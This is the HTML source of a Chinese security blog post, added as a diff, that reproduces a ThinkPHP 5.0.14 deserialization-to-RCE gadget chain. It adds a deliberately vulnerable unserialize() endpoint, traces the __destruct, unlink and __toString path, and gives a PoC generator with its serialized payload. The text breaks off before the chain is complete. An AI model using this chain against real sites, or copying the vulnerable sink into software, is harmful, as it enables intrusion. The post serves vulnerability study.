@@ -1,0 +1,841 @@
+
+
+<!DOCTYPE html>
+<html lang="zh-CN" data-default-color-scheme=auto>
+
+
+
+<head>
+  <meta charset="UTF-8">
+
+  <link rel="apple-touch-icon" sizes="76x76" href="/img/fluid.jpg">
+  <link rel="icon" href="/img/fluid.jpg">
+  
+
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#2f4154">
+  <meta name="author" content="huangdi">
+  <meta name="keywords" content="">
+  
+    <meta name="description" content="ThinkPHP5 反序列化到rce">
+<meta property="og:type" content="article">
+<meta property="og:title" content="ThinkPHP反序列化到rce">
+<meta property="og:url" content="http://huang-d1.github.io/2026/01/04/ThinkPHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%B0rce/index.html">
+<meta property="og:site_name" content="huangdi&#39;s blog">
+<meta property="og:description" content="ThinkPHP5 反序列化到rce">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="http://huang-d1.github.io/img/%E5%AE%A1%E8%AE%A1%E5%AE%9E%E6%88%98/d34.png">
+<meta property="og:image" content="http://huang-d1.github.io/img/%E5%AE%A1%E8%AE%A1%E5%AE%9E%E6%88%98/d35.png">
+<meta property="og:image" content="http://huang-d1.github.io/img/%E5%AE%A1%E8%AE%A1%E5%AE%9E%E6%88%98/d36.png">
+<meta property="og:image" content="http://huang-d1.github.io/img/%E5%AE%A1%E8%AE%A1%E5%AE%9E%E6%88%98/d37.png">
+<meta property="og:image" content="http://huang-d1.github.io/img/%E5%AE%A1%E8%AE%A1%E5%AE%9E%E6%88%98/d38.png">
+<meta property="og:image" content="http://huang-d1.github.io/img/%E5%AE%A1%E8%AE%A1%E5%AE%9E%E6%88%98/d39.png">
+<meta property="og:image" content="http://huang-d1.github.io/img/%E5%AE%A1%E8%AE%A1%E5%AE%9E%E6%88%98/d40.png">
+<meta property="article:published_time" content="2026-01-04T10:03:35.998Z">
+<meta property="article:modified_time" content="2026-01-04T10:06:58.361Z">
+<meta property="article:author" content="huangdi">
+<meta property="article:tag" content="漏洞复现">
+<meta property="article:tag" content="PHP代码审计">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:image" content="http://huang-d1.github.io/img/%E5%AE%A1%E8%AE%A1%E5%AE%9E%E6%88%98/d34.png">
+  
+  
+  
+  <title>ThinkPHP反序列化到rce - huangdi&#39;s blog</title>
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
+
+
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/github-markdown-css/4.0.0/github-markdown.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/hint.css/2.7.0/hint.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.css" />
+
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+<!-- Do not modify the link that theme dependent icons -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/c/font_1749284_5i9bdhy70f8.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/c/font_1736178_k526ubmyhba.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+
+  <link id="highlight-css" rel="stylesheet" href="/css/highlight.css" />
+  
+    <link id="highlight-css-dark" rel="stylesheet" href="/css/highlight-dark.css" />
+  
+
+
+
+
+  <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    Fluid.ctx = Object.assign({}, Fluid.ctx)
+    var CONFIG = {"hostname":"huang-d1.github.io","root":"/","version":"1.9.8","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false,"scope":[]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"code_language":{"enable":true,"default":"TEXT"},"copy_btn":true,"image_caption":{"enable":true},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"placement":"right","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":false,"follow_dnt":true,"baidu":null,"google":{"measurement_id":null},"tencent":{"sid":null,"cid":null},"leancloud":{"app_id":null,"app_key":null,"server_url":null,"path":"window.location.pathname","ignore_local":false},"umami":{"src":null,"website_id":null,"domains":null,"start_time":"2024-01-01T00:00:00.000Z","token":null,"api_server":null}},"search_path":"/local-search.xml","include_content_in_search":true};
+
+    if (CONFIG.web_analytics.follow_dnt) {
+      var dntVal = navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack;
+      Fluid.ctx.dnt = dntVal && (dntVal.startsWith('1') || dntVal.startsWith('yes') || dntVal.startsWith('on'));
+    }
+  </script>
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+  
+
+
+  
+<meta name="generator" content="Hexo 7.3.0"></head>
+
+
+<body>
+  
+
+  <header>
+    
+
+<div class="header-inner" style="height: 70vh;">
+  <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand" href="/">
+      <strong>huang-d1&#39;s blog</strong>
+    </a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/" target="_self">
+                <i class="iconfont icon-home-fill"></i>
+                <span>首页</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/" target="_self">
+                <i class="iconfont icon-archive-fill"></i>
+                <span>归档</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/categories/" target="_self">
+                <i class="iconfont icon-category-fill"></i>
+                <span>分类</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/tags/" target="_self">
+                <i class="iconfont icon-tags-fill"></i>
+                <span>标签</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/about/" target="_self">
+                <i class="iconfont icon-user-fill"></i>
+                <span>关于</span>
+              </a>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
+              <i class="iconfont icon-search"></i>
+            </a>
+          </li>
+          
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">
+              <i class="iconfont icon-dark" id="color-toggle-icon"></i>
+            </a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+  
+
+<div id="banner" class="banner" parallax=true
+     style="background: url('/img/default.png') no-repeat center center; background-size: cover;">
+  <div class="full-bg-img">
+    <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+      <div class="banner-text text-center fade-in-up">
+        <div class="h2">
+          
+            <span id="subtitle" data-typed-text="ThinkPHP反序列化到rce"></span>
+          
+        </div>
+
+        
+          
+  <div class="mt-3">
+    
+    
+      <span class="post-meta">
+        <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+        <time datetime="2026-01-04 18:03" pubdate>
+          2026年1月4日 晚上
+        </time>
+      </span>
+    
+  </div>
+
+  <div class="mt-1">
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-chart"></i>
+        
+          3.9k 字
+        
+      </span>
+    
+
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-clock-fill"></i>
+        
+        
+        
+          33 分钟
+        
+      </span>
+    
+
+    
+    
+  </div>
+
+
+        
+      </div>
+
+      
+    </div>
+  </div>
+</div>
+
+</div>
+
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid nopadding-x">
+  <div class="row nomargin-x">
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+
+    </div>
+
+    <div class="col-lg-8 nopadding-x-md">
+      <div class="container nopadding-x-md" id="board-ctn">
+        <div id="board">
+          <article class="post-content mx-auto">
+            <h1 id="seo-header">ThinkPHP反序列化到rce</h1>
+            
+            
+              <div class="markdown-body">
+                
+                <h1 id="ThinkPHP反序列化到rce"><a href="#ThinkPHP反序列化到rce" class="headerlink" title="ThinkPHP反序列化到rce"></a>ThinkPHP反序列化到rce</h1><p>自己写一个source点作为漏洞入口</p>
+<p>来到index.php文件，定义一个pop()方法</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">pop</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-title function_ invoke__">unserialize</span>(<span class="hljs-title function_ invoke__">request</span>()-&gt;<span class="hljs-title function_ invoke__">get</span>(<span class="hljs-string">&#x27;dada&#x27;</span>));<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;ok&quot;</span>;<br>    &#125;<br></code></pre></td></tr></table></figure>
+
+<h2 id="思路分析"><a href="#思路分析" class="headerlink" title="思路分析"></a>思路分析</h2><p>发现这里有unserialize反序列化函数</p>
+<p>回顾一下相关的魔术方法</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs bash">- __wakeup() //使用unserialize时触发 ！！ <br>- __sleep() //使用serialize时触发 <br>- destruct() //对象被销毁时触发 ！！ <br>- __call() //在对象上下文中调用不可访问的方法时触发 ！！<br>- __callStatic() //在静态上下文中调用不可访问的方法时触发 <br>- get() //用于从不可访问的属性读取数据 <br>- __set() //用于将数据写⼊不可访问的属性 <br>- isset() //在不可访问的属性上调用isset()或empty()触发 <br>- __unset() //在不可访问的属性上使用<span class="hljs-built_in">unset</span>()时触发<br>- __toString() //把类当作字符串使用时触发，file_exists()判断也会触发 ！<br>- __invoke() //当脚本尝试将对象调用为函数时触发<br></code></pre></td></tr></table></figure>
+
+<p>这里全局搜索destruct方法</p>
+<p>来到thinkphp_5.0.14&#x2F;thinkphp&#x2F;library&#x2F;think&#x2F;process&#x2F;pipes&#x2F;Windows.php</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">close</span>();<br>        <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">removeFiles</span>();<br>    &#125;<br></code></pre></td></tr></table></figure>
+
+<p>跟进removeFiles</p>
+<p>这里是有一个任意文件删除的</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">private</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">removeFiles</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-keyword">foreach</span> (<span class="hljs-variable language_">$this</span>-&gt;files <span class="hljs-keyword">as</span> <span class="hljs-variable">$filename</span>) &#123;<br>            <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">file_exists</span>(<span class="hljs-variable">$filename</span>)) &#123;<br>                @<span class="hljs-title function_ invoke__">unlink</span>(<span class="hljs-variable">$filename</span>);<br>            &#125;<br>        &#125;<br>        <span class="hljs-variable language_">$this</span>-&gt;files = [];<br>    &#125;<br></code></pre></td></tr></table></figure>
+
+<p>其中unlink函数会把传入参数默认为string类型去解析</p>
+<p>如果传入的$filename不是string类型而是一个对象，就会触发toString 方法</p>
+<p>全局搜索_toString</p>
+<p>直接来到漏洞点</p>
+<p>thinkphp_5.0.14&#x2F;thinkphp&#x2F;library&#x2F;think&#x2F;Model.php</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__toString</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">toJson</span>();<br>    &#125;<br></code></pre></td></tr></table></figure>
+
+<p>跟进toJson</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">toJson</span>(<span class="hljs-params"><span class="hljs-variable">$options</span> = JSON_UNESCAPED_UNICODE</span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-title function_ invoke__">json_encode</span>(<span class="hljs-variable">$this</span>-&gt;<span class="hljs-title function_ invoke__">toArray</span>(), <span class="hljs-variable">$options</span>);<br>    &#125;<br></code></pre></td></tr></table></figure>
+
+<p>toArry</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">toArray</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">   </span>&#123;<br>       <span class="hljs-variable">$item</span>    = [];<br>       <span class="hljs-variable">$visible</span> = [];<br>       <span class="hljs-variable">$hidden</span>  = [];<br><br>       <span class="hljs-variable">$data</span> = <span class="hljs-title function_ invoke__">array_merge</span>(<span class="hljs-variable">$this</span>-&gt;data, <span class="hljs-variable">$this</span>-&gt;relation);<br><br>       <span class="hljs-comment">// 过滤属性</span><br>       <span class="hljs-keyword">if</span> (!<span class="hljs-keyword">empty</span>(<span class="hljs-variable language_">$this</span>-&gt;visible)) &#123;<br>           <span class="hljs-variable">$array</span> = <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">parseAttr</span>(<span class="hljs-variable">$this</span>-&gt;visible, <span class="hljs-variable">$visible</span>);<br>           <span class="hljs-variable">$data</span>  = <span class="hljs-title function_ invoke__">array_intersect_key</span>(<span class="hljs-variable">$data</span>, <span class="hljs-title function_ invoke__">array_flip</span>(<span class="hljs-variable">$array</span>));<br>       &#125; <span class="hljs-keyword">elseif</span> (!<span class="hljs-keyword">empty</span>(<span class="hljs-variable language_">$this</span>-&gt;hidden)) &#123;<br>           <span class="hljs-variable">$array</span> = <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">parseAttr</span>(<span class="hljs-variable">$this</span>-&gt;hidden, <span class="hljs-variable">$hidden</span>, <span class="hljs-literal">false</span>);<br>           <span class="hljs-variable">$data</span>  = <span class="hljs-title function_ invoke__">array_diff_key</span>(<span class="hljs-variable">$data</span>, <span class="hljs-title function_ invoke__">array_flip</span>(<span class="hljs-variable">$array</span>));<br>       &#125;<br><br>       <span class="hljs-keyword">foreach</span> (<span class="hljs-variable">$data</span> <span class="hljs-keyword">as</span> <span class="hljs-variable">$key</span> =&gt; <span class="hljs-variable">$val</span>) &#123;<br>           <span class="hljs-keyword">if</span> (<span class="hljs-variable">$val</span> <span class="hljs-keyword">instanceof</span> Model || <span class="hljs-variable">$val</span> <span class="hljs-keyword">instanceof</span> ModelCollection) &#123;<br>               <span class="hljs-comment">// 关联模型对象</span><br>               <span class="hljs-variable">$item</span>[<span class="hljs-variable">$key</span>] = <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">subToArray</span>(<span class="hljs-variable">$val</span>, <span class="hljs-variable">$visible</span>, <span class="hljs-variable">$hidden</span>, <span class="hljs-variable">$key</span>);<br>           &#125; <span class="hljs-keyword">elseif</span> (<span class="hljs-title function_ invoke__">is_array</span>(<span class="hljs-variable">$val</span>) &amp;&amp; <span class="hljs-title function_ invoke__">reset</span>(<span class="hljs-variable">$val</span>) <span class="hljs-keyword">instanceof</span> Model) &#123;<br>               <span class="hljs-comment">// 关联模型数据集</span><br>               <span class="hljs-variable">$arr</span> = [];<br>               <span class="hljs-keyword">foreach</span> (<span class="hljs-variable">$val</span> <span class="hljs-keyword">as</span> <span class="hljs-variable">$k</span> =&gt; <span class="hljs-variable">$value</span>) &#123;<br>                   <span class="hljs-variable">$arr</span>[<span class="hljs-variable">$k</span>] = <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">subToArray</span>(<span class="hljs-variable">$value</span>, <span class="hljs-variable">$visible</span>, <span class="hljs-variable">$hidden</span>, <span class="hljs-variable">$key</span>);<br>               &#125;<br>               <span class="hljs-variable">$item</span>[<span class="hljs-variable">$key</span>] = <span class="hljs-variable">$arr</span>;<br>           &#125; <span class="hljs-keyword">else</span> &#123;<br>               <span class="hljs-comment">// 模型属性</span><br>               <span class="hljs-variable">$item</span>[<span class="hljs-variable">$key</span>] = <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">getAttr</span>(<span class="hljs-variable">$key</span>);<br>           &#125;<br>       &#125;<br>       <span class="hljs-comment">// 追加属性（必须定义获取器）</span><br>       <span class="hljs-keyword">if</span> (!<span class="hljs-keyword">empty</span>(<span class="hljs-variable language_">$this</span>-&gt;append)) &#123;<br>           <span class="hljs-keyword">foreach</span> (<span class="hljs-variable language_">$this</span>-&gt;append <span class="hljs-keyword">as</span> <span class="hljs-variable">$key</span> =&gt; <span class="hljs-variable">$name</span>) &#123;<br>               <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">is_array</span>(<span class="hljs-variable">$name</span>)) &#123;<br>                   <span class="hljs-comment">// 追加关联对象属性</span><br>                   <span class="hljs-variable">$relation</span>   = <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">getAttr</span>(<span class="hljs-variable">$key</span>);<br>                   <span class="hljs-variable">$item</span>[<span class="hljs-variable">$key</span>] = <span class="hljs-variable">$relation</span>-&gt;<span class="hljs-title function_ invoke__">append</span>(<span class="hljs-variable">$name</span>)-&gt;<span class="hljs-title function_ invoke__">toArray</span>();<br>               &#125; <span class="hljs-keyword">elseif</span> (<span class="hljs-title function_ invoke__">strpos</span>(<span class="hljs-variable">$name</span>, <span class="hljs-string">&#x27;.&#x27;</span>)) &#123;<br>                   <span class="hljs-keyword">list</span>(<span class="hljs-variable">$key</span>, <span class="hljs-variable">$attr</span>) = <span class="hljs-title function_ invoke__">explode</span>(<span class="hljs-string">&#x27;.&#x27;</span>, <span class="hljs-variable">$name</span>);<br>                   <span class="hljs-comment">// 追加关联对象属性</span><br>                   <span class="hljs-variable">$relation</span>   = <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">getAttr</span>(<span class="hljs-variable">$key</span>);<br>                   <span class="hljs-variable">$item</span>[<span class="hljs-variable">$key</span>] = <span class="hljs-variable">$relation</span>-&gt;<span class="hljs-title function_ invoke__">append</span>([<span class="hljs-variable">$attr</span>])-&gt;<span class="hljs-title function_ invoke__">toArray</span>();<br>               &#125; <span class="hljs-keyword">else</span> &#123;<br>                   <span class="hljs-variable">$relation</span> = <span class="hljs-title class_">Loader</span>::<span class="hljs-title function_ invoke__">parseName</span>(<span class="hljs-variable">$name</span>, <span class="hljs-number">1</span>, <span class="hljs-literal">false</span>);<br>                   <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">method_exists</span>(<span class="hljs-variable">$this</span>, <span class="hljs-variable">$relation</span>)) &#123;<br>                       <span class="hljs-variable">$modelRelation</span> = <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-variable">$relation</span>();<br>                       <span class="hljs-variable">$value</span>         = <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">getRelationData</span>(<span class="hljs-variable">$modelRelation</span>);<br><br>                       <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">method_exists</span>(<span class="hljs-variable">$modelRelation</span>, <span class="hljs-string">&#x27;getBindAttr&#x27;</span>)) &#123;<br>                           <span class="hljs-variable">$bindAttr</span> = <span class="hljs-variable">$modelRelation</span>-&gt;<span class="hljs-title function_ invoke__">getBindAttr</span>();<br>                           <span class="hljs-keyword">if</span> (<span class="hljs-variable">$bindAttr</span>) &#123;<br>                               <span class="hljs-keyword">foreach</span> (<span class="hljs-variable">$bindAttr</span> <span class="hljs-keyword">as</span> <span class="hljs-variable">$key</span> =&gt; <span class="hljs-variable">$attr</span>) &#123;<br>                                   <span class="hljs-variable">$key</span> = <span class="hljs-title function_ invoke__">is_numeric</span>(<span class="hljs-variable">$key</span>) ? <span class="hljs-variable">$attr</span> : <span class="hljs-variable">$key</span>;<br>                                   <span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable language_">$this</span>-&gt;data[<span class="hljs-variable">$key</span>])) &#123;<br>                                       <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-built_in">Exception</span>(<span class="hljs-string">&#x27;bind attr has exists:&#x27;</span> . <span class="hljs-variable">$key</span>);<br>                                   &#125; <span class="hljs-keyword">else</span> &#123;<br>                                       <span class="hljs-variable">$item</span>[<span class="hljs-variable">$key</span>] = <span class="hljs-variable">$value</span> ? <span class="hljs-variable">$value</span>-&gt;<span class="hljs-title function_ invoke__">getAttr</span>(<span class="hljs-variable">$attr</span>) : <span class="hljs-literal">null</span>;<br>                                   &#125;<br>                               &#125;<br>                               <span class="hljs-keyword">continue</span>;<br>                           &#125;<br>                       &#125;<br>                       <span class="hljs-variable">$item</span>[<span class="hljs-variable">$name</span>] = <span class="hljs-variable">$value</span>;<br>                   &#125; <span class="hljs-keyword">else</span> &#123;<br>                       <span class="hljs-variable">$item</span>[<span class="hljs-variable">$name</span>] = <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">getAttr</span>(<span class="hljs-variable">$name</span>);<br>                   &#125;<br>               &#125;<br>           &#125;<br>       &#125;<br>       <span class="hljs-keyword">return</span> !<span class="hljs-keyword">empty</span>(<span class="hljs-variable">$item</span>) ? <span class="hljs-variable">$item</span> : [];<br>   &#125;<br></code></pre></td></tr></table></figure>
+
+<p>关注到这行语句</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-variable">$item</span>[<span class="hljs-variable">$key</span>] = <span class="hljs-variable">$value</span> ? <span class="hljs-variable">$value</span>-&gt;<span class="hljs-title function_ invoke__">getAttr</span>(<span class="hljs-variable">$attr</span>) : <span class="hljs-literal">null</span>;<br></code></pre></td></tr></table></figure>
+
+<p>如果value是可控的</p>
+<p>那么接下来有两种思路</p>
+<ol>
+<li>调用任意一个对象(类)的getAttr方法(该对象存在)</li>
+<li>调用任意一个类的_call方法(假定该对象不存在)</li>
+</ol>
+<p>看一下value是怎么取出来的</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-variable">$relation</span> = <span class="hljs-title class_">Loader</span>::<span class="hljs-title function_ invoke__">parseName</span>(<span class="hljs-variable">$name</span>, <span class="hljs-number">1</span>, <span class="hljs-literal">false</span>);<br>                   <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">method_exists</span>(<span class="hljs-variable">$this</span>, <span class="hljs-variable">$relation</span>)) &#123;<br>                       <span class="hljs-variable">$modelRelation</span> = <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-variable">$relation</span>();<br>                       <span class="hljs-variable">$value</span>         = <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">getRelationData</span>(<span class="hljs-variable">$modelRelation</span>);<br></code></pre></td></tr></table></figure>
+
+<p>动态调试一下看看整个流程</p>
+<h2 id="poc编写"><a href="#poc编写" class="headerlink" title="poc编写"></a>poc编写</h2><p>先写一个开头，能够顺利进入pop方法</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">poc</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-variable">$windows</span>=<span class="hljs-keyword">new</span> \think\process\pipes\<span class="hljs-title function_ invoke__">Windows</span>(<span class="hljs-literal">true</span>,<span class="hljs-string">&quot;&quot;</span>);<br>        <span class="hljs-variable">$poc</span>=<span class="hljs-title function_ invoke__">urlencode</span>(<span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$windows</span>));<br>        <span class="hljs-keyword">return</span> <span class="hljs-variable">$poc</span>;<br>    &#125;<br></code></pre></td></tr></table></figure>
+
+<p>得到序列化后的对象</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs url">O%3A27%3A%22think%5Cprocess%5Cpipes%5CWindows%22%3A8%3A%7Bs%3A34%3A%22%00think%5Cprocess%5Cpipes%5CWindows%00files%22%3Ba%3A0%3A%7B%7Ds%3A40%3A%22%00think%5Cprocess%5Cpipes%5CWindows%00fileHandles%22%3Ba%3A0%3A%7B%7Ds%3A38%3A%22%00think%5Cprocess%5Cpipes%5CWindows%00readBytes%22%3Ba%3A2%3A%7Bi%3A1%3Bi%3A0%3Bi%3A2%3Bi%3A0%3B%7Ds%3A42%3A%22%00think%5Cprocess%5Cpipes%5CWindows%00disableOutput%22%3Bb%3A1%3Bs%3A5%3A%22pipes%22%3Ba%3A0%3A%7B%7Ds%3A14%3A%22%00%2A%00inputBuffer%22%3Bs%3A0%3A%22%22%3Bs%3A8%3A%22%00%2A%00input%22%3BN%3Bs%3A34%3A%22%00think%5Cprocess%5Cpipes%5CPipes%00blocked%22%3Bb%3A1%3B%7D<br></code></pre></td></tr></table></figure>
+
+<p>访问url</p>
